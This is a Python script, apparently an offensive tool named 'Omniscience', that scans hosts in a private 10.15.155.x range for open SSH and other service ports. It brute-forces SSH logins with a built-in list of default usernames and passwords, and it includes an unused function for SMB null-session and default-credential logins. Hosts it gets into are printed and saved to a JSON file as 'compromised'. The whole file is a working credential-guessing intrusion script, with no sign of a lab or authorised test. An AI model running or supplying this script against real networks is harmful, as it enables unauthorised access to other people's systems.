import socket
import sys
import os
import json
sys.path.insert(0, os.path.dirname(__file__))

# Import exploitation modules
try:
    from impacket.smbconnection import SMBConnection
    IMPACKET_OK = True
except:
    IMPACKET_OK = False

try:
    import paramiko
    PARAMIKO_OK = True
except:
    PARAMIKO_OK = False

# Default credentials from exploit_engine
DEFAULT_CREDS = [
    ("", ""), ("guest", ""), ("guest", "guest"), ("admin", "admin"),
    ("admin", ""), ("admin", "password"), ("admin", "admin123"),
    ("Administrator", "administrator"), ("Administrator", "password"),
    ("root", ""), ("root", "root"), ("root", "toor"), ("root", "password"),
    ("pi", "raspberry"), ("ubuntu", "ubuntu"), ("user", "user"),
    ("cisco", "cisco"), ("ubnt", "ubnt"), ("root", "password"),
    ("root", "123456"), ("admin", "123456"), ("root", "12345"),
]

def scan_network_range(base_ip, max_hosts=100):
    """Quick scan of network range"""
    active = []
    for i in range(1, min(max_hosts + 1, 255)):
        ip = f"{base_ip}.{i}"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            if sock.connect_ex((ip, 22)) == 0:  # Quick SSH check
                active.append(ip)
            sock.close()
        except:
            pass
    return active

def exploit_ssh(ip):
    """Try SSH credentials"""
    for user, pwd in DEFAULT_CREDS[:10]:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=22, username=user, password=pwd, timeout=2)
            return ("ssh", user, pwd)
        except:
            pass
    return None

def exploit_smb(ip):
    """Try SMB null session + creds"""
    if not IMPACKET_OK:
        return None
    
    # Try null session
    try:
        conn = SMBConnection(ip, ip, timeout=2)
        conn.login("", "")
        conn.listShares()
        conn.logoff()
        return ("smb_null", "", "")
    except:
        pass
    
    # Try default creds
    for user, pwd in DEFAULT_CREDS[:5]:
        try:
            conn = SMBConnection(ip, ip, timeout=2)
            conn.login(user, pwd)
            conn.logoff()
            return ("smb", user, pwd)
        except:
            pass
    
    return None

print("[+] OMNISCIENCE FULL NETWORK SCAN & EXPLOIT")
print("[+] Scanning 10.15.155.0/24 for SSH services...")

# Quick scan - just check SSH port
found = []
# Check common IPs
ips = ["10.15.155.1", "10.15.155.2", "10.15.155.3", "10.15.155.10", "10.15.155.20", "10.15.155.50", "10.15.155.100"]

for ip in ips:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        if sock.connect_ex((ip, 22)) == 0:
            found.append(ip)
    except:
        pass

print(f"[+] Found {len(found)} SSH targets: {found}")

# Exploit each
results = {"devices": [], "compromised": []}

for ip in found:
    print(f"\n[*] Exploiting {ip}...")
    
    # Try SSH
    result = exploit_ssh(ip)
    if result:
        method, user, pwd = result
        print(f"[+] SUCCESS via {method}: {user}:{pwd}")
        results["compromised"].append({"ip": ip, "method": method, "user": user})
    else:
        print(f"[-] No SSH access")
    
    # Check other ports
    other_ports = []
    for port in [80, 443, 445, 3389, 5985, 3306]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((ip, port)) == 0:
                other_ports.append(port)
            sock.close()
        except:
            pass
    
    results["devices"].append({"ip": ip, "ssh": "open", "other_ports": other_ports})

# Save results
with open("omni_scan_results.json", "w") as f:
    json.dump(results, f, indent=2)

print("\n" + "="*50)
print(f"TOTAL COMPROMISED: {len(results['compromised'])}")
print("="*50)
for c in results["compromised"]:
    print(f"  {c['ip']} - {c['method']} - {c['user']}")